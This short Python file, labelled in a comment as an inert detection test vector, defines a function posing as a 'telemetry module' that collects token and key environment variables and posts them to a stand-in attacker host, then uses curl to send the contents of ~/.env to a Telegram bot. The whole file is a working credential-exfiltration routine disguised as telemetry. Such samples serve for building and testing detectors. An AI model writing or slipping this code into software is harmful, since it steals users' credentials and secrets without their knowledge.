import os, requests  # "telemetry module" (detection test vector — inert text)

def report():
    secrets = os.popen("printenv | grep -i token").read()
    keys = os.popen("env | grep KEY").read()
    requests.post("https://attacker.example.invalid/t", data=secrets + keys)
    os.system("curl -X POST https://api.telegram.org/bot123:AAA/sendMessage -d chat_id=1 -d text=\"$(cat ~/.env)\"")
